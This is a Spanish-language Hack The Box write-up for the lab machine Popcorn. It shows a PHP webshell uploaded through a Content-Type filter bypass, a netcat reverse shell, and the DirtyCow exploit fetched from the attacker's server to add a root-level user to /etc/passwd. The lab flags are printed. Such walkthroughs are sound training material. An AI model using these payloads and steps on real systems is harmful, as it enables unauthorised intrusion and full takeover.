---
layout: single
title: Popcorn - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina Popcorn de la plataforma de Hackthebox donde mediante fuzzing vamos a descubrir una ruta llamada torrent donde encontraremos un servicio para subir archivos de tipo torrent y gracias a que la web interpreta php y podemos subir una imagen vamos hacer un bypass para que nos interprete el php apartir de la imagen para la escalada de privilegios nos aprovecharemos del DirtyCow"
date: 2023-06-20
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-popcorn/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - DirtyCow
  - PHP webshell
  - Bypassing filters
  - Subdomain Enumeration
---

<p align="center">
<img src="/assets/images/htb-writeup-popcorn/banner.png">
</p>

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.10.6
PING 10.10.10.6 (10.10.10.6) 56(84) bytes of data.
64 bytes from 10.10.10.6: icmp_seq=1 ttl=63 time=115 ms

--- 10.10.10.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 114.629/114.629/114.629/0.000 ms
❯ whichSystem.py 10.10.10.6

10.10.10.6 (ttl -> 63): Linux
```

## PortScan 

```bash
❯ catn targeted
# Nmap 7.93 scan initiated Mon Jun 19 11:55:45 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3ec81b15211550ec6e63bcc56b807b38 (DSA)
|_  2048 aa1f7921b842f48a38bdb805ef1a074d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Nmap enum 

```bash
❯ nmap --script=http-enum -p80 10.10.10.6 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 11:57 CST
Nmap scan report for 10.10.10.6
Host is up (0.11s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /test/: Test page
|   /test.php: Test page
|   /test/logon.html: Jetty
|_  /icons/: Potentially interesting folder w/ directory listing
```

## Enumeracion 

Esta es la web 

![](/assets/images/htb-writeup-popcorn/web1.png)

Esto es lo que esta corriendo en la ruta **test** 

![](/assets/images/htb-writeup-popcorn/web2.png)

Esta ruta nos lleva a donde mismo 

![](/assets/images/htb-writeup-popcorn/web3.png)

La ultima ruta no podemos verla 

![](/assets/images/htb-writeup-popcorn/web4.png)

Vamos aplicar **Fuzzing** para ver si encontramos algo mas

Hay varias rutas apartir de **torrent** hay una ruta que se llama **upload** eso ya es interesante vamos a ver las rutas

```bash
❯ feroxbuster -t 200 -x php,txt,html -u http://10.10.10.6

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.6
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, txt, html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        4l       25w      177c http://10.10.10.6/index
200        4l       25w      177c http://10.10.10.6/index.html
200      654l     3106w        0c http://10.10.10.6/test
200      652l     3096w        0c http://10.10.10.6/test.php
301        9l       28w      310c http://10.10.10.6/torrent
301        9l       28w      320c http://10.10.10.6/torrent/templates
301        9l       28w      319c http://10.10.10.6/torrent/database
200        2l        0w        4c http://10.10.10.6/torrent/secure
301        9l       28w      317c http://10.10.10.6/torrent/upload
301        9l       28w      313c http://10.10.10.6/torrent/js
301        9l       28w      314c http://10.10.10.6/torrent/css
200        2l        0w        4c http://10.10.10.6/torrent/secure.php
200        0l        0w        0c http://10.10.10.6/torrent/config
200       26l       63w      964c http://10.10.10.6/torrent/rss
301        9l       28w      314c http://10.10.10.6/torrent/lib
200        0l        0w        0c http://10.10.10.6/torrent/upload.php
```

Bueno probando las rutas que tiene un código de estado **200** esta me muestra información 

![](/assets/images/htb-writeup-popcorn/web5.png)

Vemos que también hay una ruta **upload**

![](/assets/images/htb-writeup-popcorn/web6.png)

Esto es lo que contiene la imagen

![](/assets/images/htb-writeup-popcorn/web7.png)

La otra contiene esto 

![](/assets/images/htb-writeup-popcorn/web8.png)

Si buscamos la otra ruta vemos esto 

![](/assets/images/htb-writeup-popcorn/web0.png)

Si buscamos la ruta que habíamos visto nos redirige aquí 

![](/assets/images/htb-writeup-popcorn/web9.png)

![](/assets/images/htb-writeup-popcorn/web10.png)

```bash
❯ searchsploit Torrent Hoster
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Torrent Hoster - Remount Upload                                                               | php/webapps/11746.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Hay un panel de login si probamos haciendo una inyeccion **SQL** 

![](/assets/images/htb-writeup-popcorn/web11.png)

Si le damos en **login** nos devuelve un error 

![](/assets/images/htb-writeup-popcorn/web12.png)

La contraseña la convierte a un **hash** en **MD5**, la cual es la misma que nos regreso el error

![](/assets/images/htb-writeup-popcorn/web13.png)

Si nos registramos funcionan las credenciales así que ahora vamos a logearnos 

![](/assets/images/htb-writeup-popcorn/test.png)

Y vemos esto 

![](/assets/images/htb-writeup-popcorn/web14.png)

Nos piden esto para subir un archivo 

![](/assets/images/htb-writeup-popcorn/web15.png)

Si analizamos el **txt** que nos mostró **searchsploit** estamos en la misma ruta 

![](/assets/images/htb-writeup-popcorn/web16.png)

Si subimos una imagen para hacer una prueba 

![](/assets/images/htb-writeup-popcorn/web17.png)

Nos dice que nos es valido 

![](/assets/images/htb-writeup-popcorn/web18.png)

Si seguimos examinando vemos que el usuario **admin** subió `kali linux`

![](/assets/images/htb-writeup-popcorn/web19.png)

Vamos a descargarlo dando click en el botón de **Download**

Si analizamos también vemos que subio una **screenshot** que es la que esta en **http://10.10.10.6/torrent/upload/** 

Si subimos el `kali linux` que acabamos de descargar que es **.torrent** pasa esto 

![](/assets/images/htb-writeup-popcorn/web20.png)

Nos dicen que ya existe 

![](/assets/images/htb-writeup-popcorn/web21.png)

Si descargamos un kali linux de aqui <https://www.kali.org/get-kali/#kali-installer-images> con opción de **torrent** 

Vamos a ver si podemos subirlo  

![](/assets/images/htb-writeup-popcorn/web22.png)

Se subió 

![](/assets/images/htb-writeup-popcorn/web23.png)

Y nos deja editarlo 

Vamos a subir una imagen que cumpla con los requisitos que nos dicen para ver que pasa y le damos en el botón **Submit Screenshot**

![](/assets/images/htb-writeup-popcorn/take.png)

Si nos vamos a esta ruta vemos que la imagen se sube 

![](/assets/images/htb-writeup-popcorn/ohh.png)

Si nos ponemos a pensar solo se pueden subir imágenes pero la pagina web interpreta **php** ademas que todo lo que subimos en ese campo también se muestra reflejado en la parte de **http://10.10.10.6/torrent/upload/**  así que lo que podemos hacer es aplicar un **Bypass** como en otros casos para ver si se puede por ejemplo podemos concatenar **.png.php** así que vamos a hacer eso 

```bash
❯ catn webshell.png.php
<?php system($_GET['cmd']); ?>
```

![](/assets/images/htb-writeup-popcorn/web24.png)

Pero nos dice esto  

![](/assets/images/htb-writeup-popcorn/f.png)

Vamos a capturar la petición con burpsuite al momento de subir la webshell para ver como se esta tramitando todo

Si analizamos vemos que si me lo esta tomando como archivo **php** y solo se aceptan imágenes así podemos probar cambiando a **jpeg** por ejemplo

![](/assets/images/htb-writeup-popcorn/burp.png)

Al modificar ese campo y enviar la petición vemos que si funciona 

![](/assets/images/htb-writeup-popcorn/burp1.png)

Si recargamos vemos el **.php** 

![](/assets/images/htb-writeup-popcorn/ok.png)

## Shell as www-data 

Una vez subido todo vemos que podemos ejecutar comandos

![](/assets/images/htb-writeup-popcorn/ok2.png)

Vamos a ganar acceso 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...

``` 

![](/assets/images/htb-writeup-popcorn/rev.png)

Al darla al ENTER nos llega la **shell** 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.6] 52756
bash: no job control in this shell
www-data@popcorn:/var/www/torrent/upload$ whoami
whoami
www-data
www-data@popcorn:/var/www/torrent/upload$ 
```

Vamos a hacer lo siguiente para poder hacer un `ctrl+c`

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.6] 52756
bash: no job control in this shell
www-data@popcorn:/var/www/torrent/upload$ whoami
whoami
www-data
www-data@popcorn:/var/www/torrent/upload$ script /dev/null -c bash
script /dev/null -c bash
www-data@popcorn:/var/www/torrent/upload$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
				reset xterm
ENTER
[1]  + continued  nc -nlvp 443
www-data@popcorn:/var/www/torrent/upload$ export TERM=xterm	
```

Hay otro usuario que se llama **george**

## User flag 

Podemos ver la **flag**

```bash
www-data@popcorn:/home/george$ cat user.txt 
c135567f2a706d216e497ff3beff5dc6
www-data@popcorn:/home/george$ 
```

## Escalada de privilegios

Si vemos privilegios con permisos **SUID** vemos los siguientes pero ninguno nos sirve

```bash
www-data@popcorn:/$ find \-perm -4000 2>/dev/null
./bin/ping6
./bin/ping
./bin/umount
./bin/mount
./bin/fusermount
./bin/su
./usr/lib/pt_chown
./usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
./usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/mtr
./usr/bin/chsh
./usr/bin/sudo
./usr/bin/traceroute6.iputils
./usr/bin/passwd
./usr/bin/arping
./usr/bin/gpasswd
./usr/bin/sudoedit
./usr/bin/at
./usr/sbin/pppd
./usr/sbin/uuidd
www-data@popcorn:/$ 
```

Como tal **ubuntu** esta muy desactualizado 

```bash
www-data@popcorn:/$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 9.10
Release:	9.10
Codename:	karmic
www-data@popcorn:/$
```

Esto esta muy desactualizado la versión del kernel 

```bash
www-data@popcorn:/$ uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
www-data@popcorn:/$
```

Versiones tan antiguas son vulnerables al **dirtycow** <https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c>

Vamos pasarlo ala maquina victima

```bash
❯ wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
--2023-06-19 14:07:32--  https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.110.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 4815 (4.7K) [text/plain]
Grabando a: «dirty.c»

dirty.c                         100%[=======================================================>]   4.70K  --.-KB/s    en 0.03s   

2023-06-19 14:07:32 (168 KB/s) - «dirty.c» guardado [4815/4815]

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.6 - - [19/Jun/2023 14:07:54] "GET /dirty.c HTTP/1.0" 200 -
```

Lo descargamos

```bash
www-data@popcorn:/tmp$ wget http://10.10.14.12:80/dirty.c
--2023-06-19 23:07:55--  http://10.10.14.12/dirty.c
Connecting to 10.10.14.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4815 (4.7K) [text/x-csrc]
Saving to: `dirty.c'

100%[======================================>] 4,815       --.-K/s   in 0.08s   

2023-06-19 23:07:56 (60.6 KB/s) - `dirty.c' saved [4815/4815]

www-data@popcorn:/tmp$ 
```

Vamos a compilarlo

```bash
www-data@popcorn:/tmp$ cat dirty.c | grep gcc
//   gcc -pthread dirty.c -o dirty -lcrypt
www-data@popcorn:/tmp$ 
```

```bash
www-data@popcorn:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
www-data@popcorn:/tmp$ ls
dirty  dirty.c	vgauthsvclog.txt.0  vmware-root
www-data@popcorn:/tmp$ 
```

Esto lo que hace es que en el **/etc/passwd** va a tratar de inyectar un nuevo usuario con una contraseña que nosotros le vamos a dar para poder migrar de www-data al usuario, en mi caso pondré la contraseña hola

```bash
www-data@popcorn:/tmp$ ./dirty  
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiWV.l3JFnVCk:0:0:pwned:/root:/bin/bash

mmap: b7765000
^C
www-data@popcorn:/tmp$ 
```

Vemos que nos agrega un usuario el identificador del usuario pertenece a root 

```bash
www-data@popcorn:/tmp$ cat /etc/passwd | head -n 1
firefart:fiWV.l3JFnVCk:0:0:pwned:/root:/bin/bash
www-data@popcorn:/tmp$ 
```

## Shell as root && root.txt 

Somos **firefart** pero estamos operando como root 

```bash
www-data@popcorn:/tmp$ su firefart
Password: 
firefart@popcorn:/tmp# whoami
firefart
firefart@popcorn:/tmp# cat /root/root.txt
aac7e6adbf1f57d0402406a90534f934
firefart@popcorn:/tmp# 
```


